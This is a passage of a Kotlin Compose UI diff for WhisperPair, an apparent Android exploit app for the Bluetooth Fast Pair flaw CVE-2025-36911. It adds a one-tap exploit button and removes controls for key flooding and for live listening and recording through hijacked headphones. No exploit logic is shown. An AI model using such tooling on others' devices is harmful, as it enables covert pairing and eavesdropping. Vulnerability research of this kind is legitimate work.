     onTest: () -> Unit,
-    onExploit: () -> Unit,
-    onWriteAccountKey: () -> Unit,
-    onFloodKeys: () -> Unit,
-    onConnectHfp: () -> Unit,
-    onStartRecording: () -> Unit,
-    onStopRecording: () -> Unit,
-    onStartListening: () -> Unit,
-    onStopListening: () -> Unit
+    onExploit: () -> Unit
 ) {
     val statusColor by animateColorAsState(
         when (device.status) {
@@ -860,7 +1415,7 @@ fun DeviceCard(
             Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.Top) {
                 Row(modifier = Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
                     Box(modifier = Modifier.size(44.dp).clip(CircleShape).background(statusColor.copy(alpha = 0.15f)), contentAlignment = Alignment.Center) {
-                        Icon(Icons.Default.Headphones, null, tint = statusColor, modifier = Modifier.size(24.dp))
+                        Icon(if (device.isFastPair) Icons.Default.Headphones else Icons.Default.Bluetooth, null, tint = statusColor, modifier = Modifier.size(24.dp))
                     }
                     Spacer(Modifier.width(12.dp))
                     Column(modifier = Modifier.weight(1f)) {
@@ -875,22 +1430,36 @@ fun DeviceCard(
             Spacer(Modifier.height(12.dp))
 
             Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
-                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
+                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                     InfoChip(when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> Icons.Default.NetworkWifi; SignalStrength.FAIR -> Icons.Default.Wifi; else -> Icons.Default.WifiOff }, "${device.rssi} dBm", when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> SignalStrong; SignalStrength.FAIR -> SignalMedium; else -> SignalWeak })
-                    InfoChip(if (device.isPairingMode) Icons.Default.Link else Icons.Default.LinkOff, if (device.isPairingMode) "Pairing" else "Idle", if (device.isPairingMode) TestingBlue else TextSecondary)
+                    if (device.isFastPair) {
+                        InfoChip(if (device.isPairingMode) Icons.Default.Link else Icons.Default.LinkOff, if (device.isPairingMode) "Pairing" else "Idle", if (device.isPairingMode) TestingBlue else TextSecondary)
+                    } else {
+                        InfoChip(Icons.Default.Bluetooth, "BLE", TextSecondary)
+                    }
                 }
-                if (!device.isPairingMode && device.status != DeviceStatus.TESTING && (device.status == DeviceStatus.NOT_TESTED || device.status == DeviceStatus.ERROR)) {
-                    FilledTonalButton(onClick = onTest, colors = ButtonDefaults.filledTonalButtonColors(containerColor = CyanPrimary.copy(alpha = 0.2f), contentColor = CyanPrimary), contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp), modifier = Modifier.height(32.dp)) {
+                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
+                    if (!device.isPairingMode && device.status != DeviceStatus.TESTING && device.status != DeviceStatus.VULNERABLE) {
+                        IconButton(
+                            onClick = onExploit,
+                            modifier = Modifier.size(32.dp)
+                        ) {
+                            Icon(Icons.Default.AutoAwesome, null, tint = VulnerableRed, modifier = Modifier.size(18.dp))
+                        }
+                    }
+                    if (!device.isPairingMode && device.status != DeviceStatus.TESTING && (device.status == DeviceStatus.NOT_TESTED || device.status == DeviceStatus.ERROR)) {
+                        FilledTonalButton(onClick = onTest, colors = ButtonDefaults.filledTonalButtonColors(containerColor = CyanPrimary.copy(alpha = 0.2f), contentColor = CyanPrimary), contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp), modifier = Modifier.height(32.dp)) {
                         Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                         Spacer(Modifier.width(4.dp))
                         Text("Test", fontSize = 12.sp)
                     }
-                }
-                if (device.status == DeviceStatus.TESTING) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = TestingBlue)
-                        Spacer(Modifier.width(8.dp))
-                        Text("Testing...", fontSize = 12.sp, color = TestingBlue)
+                    }
+                    if (device.status == DeviceStatus.TESTING) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = TestingBlue)
+                            Spacer(Modifier.width(8.dp))
+                            Text("Testing...", fontSize = 12.sp, color = TestingBlue)
+                        }
                     }
                 }
             }
@@ -904,86 +1473,28 @@ fun DeviceCard(
                 }
             }
 
+            // Exploit progress display (shown for all devices during/after quick exploit)
+            exploitResult?.let { result ->
+                Spacer(Modifier.height(8.dp))
+                val bgColor = when { result.startsWith("PAIRED") || result.startsWith("KEY") -> PatchedGreen; result.startsWith("PARTIAL") -> WarningOrange; result.startsWith("FAILED") -> VulnerableRed; else -> CyanPrimary }
+                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(bgColor.copy(alpha = 0.15f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
+                    Icon(when { result.startsWith("PAIRED") || result.startsWith("KEY") -> Icons.Default.CheckCircle; result.startsWith("PARTIAL") -> Icons.Default.Warning; result.startsWith("FAILED") -> Icons.Default.Error; else -> Icons.Default.Sync }, null, tint = bgColor, modifier = Modifier.size(16.dp))
+                    Spacer(Modifier.width(8.dp))
+                    Text(result, style = MaterialTheme.typography.labelSmall, color = TextPrimary, maxLines = 2, overflow = TextOverflow.Ellipsis)
+                }
+            }
+
             // Vulnerable device controls
             if (device.status == DeviceStatus.VULNERABLE) {
                 Spacer(Modifier.height(12.dp))
 
-                exploitResult?.let { result ->
-                    val bgColor = when { result.startsWith("PAIRED") || result.startsWith("KEY") -> PatchedGreen; result.startsWith("PARTIAL") -> WarningOrange; result.startsWith("FAILED") -> VulnerableRed; else -> CyanPrimary }
-                    Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(bgColor.copy(alpha = 0.15f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
-                        Icon(when { result.startsWith("PAIRED") || result.startsWith("KEY") -> Icons.Default.CheckCircle; result.startsWith("PARTIAL") -> Icons.Default.Warning; result.startsWith("FAILED") -> Icons.Default.Error; else -> Icons.Default.Sync }, null, tint = bgColor, modifier = Modifier.size(16.dp))
-                        Spacer(Modifier.width(8.dp))
-                        Text(result, style = MaterialTheme.typography.labelSmall, color = TextPrimary, maxLines = 2, overflow = TextOverflow.Ellipsis)
-                    }
-                    Spacer(Modifier.height(8.dp))
-                }
-
-                audioState?.message?.let { msg ->
-                    Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(when { audioState.isListening -> Color(0xFFE91E63); audioState.isRecording -> VulnerableRed; audioState.isConnected -> PatchedGreen; else -> CyanPrimary }.copy(alpha = 0.2f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
-                        Icon(if (audioState.isListening || audioState.isRecording) Icons.Default.Mic else Icons.Default.Headset, null, tint = if (audioState.isListening) Color(0xFFE91E63) else if (audioState.isRecording) VulnerableRed else PatchedGreen, modifier = Modifier.size(16.dp))
-                        Spacer(Modifier.width(8.dp))
-                        Text(msg, style = MaterialTheme.typography.labelSmall, color = TextPrimary)
-                    }
-                    Spacer(Modifier.height(8.dp))
-                }
-
                 val isOperating = exploitResult?.let { it.startsWith("Connecting") || it.startsWith("Writing") || it.startsWith("Flooding") } == true
 
-                // Row 1: Magic button
+                // Magic button
                 Button(onClick = { showMagicDialog = true }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = VulnerableRed), enabled = !isOperating) {
                     Icon(Icons.Default.AutoAwesome, null, Modifier.size(18.dp))
                     Spacer(Modifier.width(8.dp))
                     Text("Magic - Pair Device", fontWeight = FontWeight.Bold)
-                }
-
-                // Row 2: Audio controls (only if paired)
-                if (isPaired) {
-                    Spacer(Modifier.height(8.dp))
-                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                        if (audioState?.isConnected == true) {
-                            // Live listen button
-                            Button(
-                                onClick = { if (audioState.isListening) onStopListening() else onStartListening() },
-                                modifier = Modifier.weight(1f),
-                                colors = ButtonDefaults.buttonColors(containerColor = if (audioState.isListening) VulnerableRed else Color(0xFFE91E63))
-                            ) {
-                                Icon(if (audioState.isListening) Icons.Default.Stop else Icons.Default.Hearing, null, Modifier.size(16.dp))
-                                Spacer(Modifier.width(4.dp))
-                                Text(if (audioState.isListening) "Stop" else "Live", fontSize = 13.sp)
-                            }
-                            // Record button
-                            Button(
-                                onClick = { if (audioState.isRecording) onStopRecording() else onStartRecording() },
-                                modifier = Modifier.weight(1f),
-                                colors = ButtonDefaults.buttonColors(containerColor = if (audioState.isRecording) VulnerableRed else PatchedGreen)
-                            ) {
-                                Icon(if (audioState.isRecording) Icons.Default.Stop else Icons.Default.FiberManualRecord, null, tint = if (audioState.isRecording) Color.White else VulnerableRed, modifier = Modifier.size(16.dp))
-                                Spacer(Modifier.width(4.dp))
-                                Text(if (audioState.isRecording) "Stop" else "Record", fontSize = 13.sp)
-                            }
-                        } else {
-                            Button(onClick = onConnectHfp, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) {
-                                Icon(Icons.Default.Headset, null, Modifier.size(18.dp))
-                                Spacer(Modifier.width(8.dp))
-                                Text("Connect Audio (HFP)")
-                            }
-                        }
-                    }
-                }
-
-                // Row 3: Account key operations
-                Spacer(Modifier.height(8.dp))
-                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                    OutlinedButton(onClick = onWriteAccountKey, modifier = Modifier.weight(1f), colors = ButtonDefaults.outlinedButtonColors(contentColor = WarningOrange), enabled = !isOperating) {
-                        Icon(Icons.Default.Key, null, Modifier.size(16.dp))
-                        Spacer(Modifier.width(4.dp))
-                        Text("Key", fontSize = 13.sp)
-                    }
-                    OutlinedButton(onClick = onFloodKeys, modifier = Modifier.weight(1f), colors = ButtonDefaults.outlinedButtonColors(contentColor = VulnerableRed), enabled = !isOperating) {
-                        Icon(Icons.Default.Flood, null, Modifier.size(16.dp))
-                        Spacer(Modifier.width(4.dp))
-                        Text("Flood", fontSize = 13.sp)
-                    }
                 }
             }
         }
@@ -1101,7 +1612,7 @@ fun AboutDialog(onDismiss: () -> Unit) {
                     modifier = Modifier.size(72.dp)
                 )
                 Spacer(Modifier.height(8.dp))
-                Text("WhisperPair v1.0", fontWeight = FontWeight.Bold)
+                Text("WhisperPair v1.1", fontWeight = FontWeight.Bold)
                 Text("CVE-2025-36911 Vulnerability Scanner", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
             }
         },
@@ -1110,6 +1621,26 @@ fun AboutDialog(onDismiss: () -> Unit) {
                 // Developer
                 SectionHeader("Developer")
                 LinkRow("@ZalexDev", "https://github.com/zalexdev", uriHandler)
+
+                Spacer(Modifier.height(8.dp))
+
+                // Disclaimer
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .clip(RoundedCornerShape(8.dp))
+                        .background(TextSecondary.copy(alpha = 0.1f))
+                        .padding(10.dp),
+                    verticalAlignment = Alignment.Top
+                ) {
+                    Icon(Icons.Default.Info, null, tint = TextSecondary, modifier = Modifier.size(16.dp))
+                    Spacer(Modifier.width(8.dp))
+                    Text(
+                        "This is an independent implementation. The KU Leuven researchers discovered the vulnerability but have not released any code and are not affiliated with this project.",
+                        style = MaterialTheme.typography.labelSmall,
+                        color = TextSecondary
+                    )
+                }
 
                 Spacer(Modifier.height(12.dp))
 
